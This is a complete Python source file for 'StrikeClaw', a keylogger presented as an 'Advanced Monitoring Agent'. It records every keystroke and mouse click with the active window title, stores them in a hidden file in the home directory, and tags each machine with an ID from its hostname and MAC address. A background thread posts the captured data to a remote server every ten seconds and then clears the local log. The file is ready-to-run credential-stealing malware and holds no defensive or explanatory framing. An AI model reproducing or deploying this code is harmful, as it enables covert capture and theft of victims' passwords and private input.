#!/usr/bin/env python3
"""
StrikeClaw - Advanced Monitoring Agent
Captures keystrokes and mouse clicks with application context
"""

import os
import sys
import time
import json
import socket
import threading
import uuid
import platform
import requests
from pynput import keyboard, mouse

# ========== STRIKECLAW CONFIGURATION ==========
SERVER_URL = "http://localhost:8080/log.php"   # CHANGE THIS
LOG_FILE = os.path.expanduser("~/.strikeclaw_data.log")
AGENT_ID_FILE = os.path.expanduser("~/.strikeclaw_id")
SEND_INTERVAL = 10      # seconds between send attempts
DEBUG = True            # set to False to disable console output
# ===============================================

# Platform-specific imports for window detection
system = platform.system()
WINDOWS_SUPPORT = False
LINUX_SUPPORT = False
MAC_SUPPORT = False

if system == "Windows":
    try:
        import win32gui
        WINDOWS_SUPPORT = True
    except ImportError:
        if DEBUG:
            print("[⚠️] pywin32 not installed. Window titles won't be captured.")
            print("Install with: pip install pywin32")
elif system == "Linux":
    try:
        from ewmh import EWMH
        LINUX_SUPPORT = True
        ewmh = EWMH()
    except ImportError:
        if DEBUG:
            print("[⚠️] ewmh not installed. Window titles won't be captured.")
            print("Install with: pip install ewmh")
elif system == "Darwin":  # macOS
    try:
        from AppKit import NSWorkspace
        MAC_SUPPORT = True
    except ImportError:
        if DEBUG:
            print("[⚠️] PyObjC not installed. Window titles won't be captured.")
            print("Install with: pip install pyobjc-framework-Cocoa")

def debug_print(*args, **kwargs):
    """Print debug messages if DEBUG is enabled."""
    if DEBUG:
        print("[StrikeClaw]", *args, **kwargs)

# ------------------ Active Window Detection ------------------
def get_active_window_title():
    """Get the title of the currently active window."""
    system = platform.system()
    
    try:
        if system == "Windows" and WINDOWS_SUPPORT:
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window) or "Unknown"
        
        elif system == "Linux" and LINUX_SUPPORT:
            active_window = ewmh.getActiveWindow()
            if active_window:
                window_name = ewmh.getWmName(active_window)
                return window_name if window_name else "Unknown"
            return "Unknown"
        
        elif system == "Darwin" and MAC_SUPPORT:
            workspace = NSWorkspace.sharedWorkspace()
            active_app = workspace.activeApplication()
            if active_app:
                return active_app.get('NSApplicationName', 'Unknown')
            return "Unknown"
        
        else:
            return f"Unsupported OS: {system}"
            
    except Exception as e:
        debug_print(f"Error getting window title: {e}")
        return "Error detecting window"

# ------------------ Unique Agent ID ------------------
def get_agent_id():
    """Generate or load a persistent unique agent ID."""
    if os.path.exists(AGENT_ID_FILE):
        with open(AGENT_ID_FILE, 'r') as f:
            return f.read().strip()
    else:
        hostname = socket.gethostname()
        try:
            mac_int = uuid.getnode()
            mac_hex = ':'.join(("%012X" % mac_int)[i:i+2] for i in range(0,12,2))
            # Use last 8 chars of MAC for shorter ID
            short_mac = mac_hex.replace(':', '')[-8:]
        except:
            short_mac = "unknown"
        
        agent_id = f"SC-{hostname}-{short_mac}"
        
        # Ensure ID doesn't contain problematic characters
        agent_id = agent_id.replace(' ', '_').replace('.', '-')
        
        with open(AGENT_ID_FILE, 'w') as f:
            f.write(agent_id)
        return agent_id

AGENT_ID = get_agent_id()
debug_print(f"StrikeClaw Agent ID: {AGENT_ID}")

# ------------------ Log File Handling ------------------
file_lock = threading.Lock()

def ensure_log_file():
    """Create log file if it doesn't exist."""
    log_dir = os.path.dirname(LOG_FILE)
    if log_dir and not os.path.exists(log_dir):
        os.makedirs(log_dir, exist_ok=True)
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w', encoding='utf-8') as f:
            f.write(f"# StrikeClaw Agent: {AGENT_ID}\n")
            f.write(f"# Started at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("#" + "="*50 + "\n")

ensure_log_file()

# ------------------ Keylogger Callback ------------------
def on_press(key):
    """Log every key press with timestamp and active window."""
    try:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        active_window = get_active_window_title()
        
        # Handle regular characters
        if hasattr(key, 'char') and key.char is not None:
            key_str = key.char
        else:
            # Special keys
            key_map = {
                'Key.space': '<SPACE>',
                'Key.enter': '<ENTER>',
                'Key.tab': '<TAB>',
                'Key.backspace': '<BACKSPACE>',
                'Key.shift': '<SHIFT>',
                'Key.ctrl': '<CTRL>',
                'Key.alt': '<ALT>',
                'Key.cmd': '<CMD>',
                'Key.esc': '<ESC>',
                'Key.up': '<UP>',
                'Key.down': '<DOWN>',
                'Key.left': '<LEFT>',
                'Key.right': '<RIGHT>'
            }
            key_str = key_map.get(str(key), str(key).replace('Key.', '<') + '>')
        
        # Format: [KEY] timestamp | Window: [window] | Key: [key]
        log_entry = f"[KEY] {timestamp} | Window: {active_window} | Key: {key_str}\n"
        
        with file_lock:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(log_entry)
        
        if DEBUG:
            # Only show first 30 chars of window name
            short_window = active_window[:30] + "..." if len(active_window) > 30 else active_window
            debug_print(f"KEY: {key_str} in [{short_window}]")
            
    except Exception as e:
        debug_print(f"Key logging error: {e}")

# ------------------ Mouse Click Callback ------------------
def on_click(x, y, button, pressed):
    """Log mouse clicks with coordinates, button, and active window."""
    if pressed:  # Only log on press, not release
        try:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            button_name = str(button).replace('Button.', '')
            active_window = get_active_window_title()
            
            log_entry = f"[MOUSE] {timestamp} | Window: {active_window} | Click at ({x}, {y}) with {button_name}\n"
            
            with file_lock:
                with open(LOG_FILE, 'a', encoding='utf-8') as f:
                    f.write(log_entry)
            
            if DEBUG:
                short_window = active_window[:30] + "..." if len(active_window) > 30 else active_window
                debug_print(f"MOUSE: {button_name} at ({x}, {y}) in [{short_window}]")
                
        except Exception as e:
            debug_print(f"Mouse logging error: {e}")

# ------------------ Internet Connectivity Check ------------------
def is_connected():
    """Check if we can reach the server (or any reliable host)."""
    try:
        # Try to connect to Google DNS quickly
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except OSError:
        return False

# ------------------ Log Sender Thread ------------------
def send_logs():
    """Periodically send log file to server if online."""
    consecutive_failures = 0
    
    while True:
        time.sleep(SEND_INTERVAL)
        
        # Skip if no log file or it's empty
        if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
            continue
        
        # Check file size - don't send if it's too small (maybe just header)
        if os.path.getsize(LOG_FILE) < 100:  # Less than 100 bytes
            continue
        
        # Wait for internet connection
        if not is_connected():
            debug_print("No internet connection, will retry later.")
            consecutive_failures += 1
            continue
        
        # Read current logs
        with file_lock:
            try:
                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                    data = f.read()
                if not data or len(data.strip()) < 50:  # Skip if almost empty
                    continue
            except Exception as e:
                debug_print(f"Error reading log file: {e}")
                continue
        
        # Attempt to send
        try:
            debug_print(f"Attempting to send {len(data)} bytes to server...")
            
            response = requests.post(
                SERVER_URL,
                data={
                    'client_id': AGENT_ID,
                    'data': data
                },
                timeout=15,
                headers={'User-Agent': 'StrikeClaw-Agent/2.0'}
            )
            
            if response.status_code == 200:
                # Success: clear the log file
                with file_lock:
                    # Write header back to file
                    with open(LOG_FILE, 'w', encoding='utf-8') as f:
                        f.write(f"# StrikeClaw Agent: {AGENT_ID}\n")
                        f.write(f"# Last sync: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write("#" + "="*50 + "\n")
                
                debug_print(f"✅ Data sent successfully ({len(data)} bytes)")
                consecutive_failures = 0
            else:
                debug_print(f"❌ Server returned HTTP {response.status_code}")
                consecutive_failures += 1
                
        except requests.exceptions.ConnectionError:
            debug_print("❌ Cannot connect to server")
            consecutive_failures += 1
        except requests.exceptions.Timeout:
            debug_print("❌ Connection timeout")
            consecutive_failures += 1
        except requests.exceptions.RequestException as e:
            debug_print(f"❌ Request failed: {e}")
            consecutive_failures += 1
        except Exception as e:
            debug_print(f"❌ Unexpected error: {e}")
            consecutive_failures += 1
        
        # If too many failures, increase sleep temporarily
        if consecutive_failures > 5:
            debug_print("Too many failures, waiting longer...")
            time.sleep(300)  # Wait 5 minutes extra

# ------------------ Main ------------------
def main():
    """Main entry point for StrikeClaw agent."""
    
    # Print banner
    print("""
    ╔═══════════════════════════════════════╗
    ║        STRIKECLAW v2.0                ║
    ║     Advanced Monitoring Agent         ║
    ╚═══════════════════════════════════════╝
    """)
    
    debug_print(f"System: {platform.system()} {platform.release()}")
    debug_print(f"Agent ID: {AGENT_ID}")
    debug_print(f"Log file: {LOG_FILE}")
    debug_print(f"Server: {SERVER_URL}")
    
    # Check platform support
    if platform.system() == "Windows" and not WINDOWS_SUPPORT:
        debug_print("⚠️ Window title detection disabled - install pywin32")
    elif platform.system() == "Linux" and not LINUX_SUPPORT:
        debug_print("⚠️ Window title detection disabled - install ewmh")
    elif platform.system() == "Darwin" and not MAC_SUPPORT:
        debug_print("⚠️ Window title detection disabled - install pyobjc")
    else:
        debug_print("✅ Window title detection enabled")
    
    # Start sender thread
    sender = threading.Thread(target=send_logs, daemon=True)
    sender.start()
    debug_print(f"✅ Sender thread started (interval: {SEND_INTERVAL}s)")
    
    # Start keyboard listener
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    debug_print("✅ Keyboard listener started")
    
    # Start mouse listener
    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()
    debug_print("✅ Mouse listener started")
    
    debug_print("\n🟢 StrikeClaw is ACTIVE - Press Ctrl+C to stop\n")
    
    try:
        # Keep main thread alive
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        debug_print("\n\n🛑 Stopping StrikeClaw...")
        keyboard_listener.stop()
        mouse_listener.stop()
        debug_print("✅ Listeners stopped")
        debug_print(f"📁 Log file preserved at: {LOG_FILE}")
        debug_print("👋 Goodbye!")
        sys.exit(0)

if __name__ == "__main__":
    main()
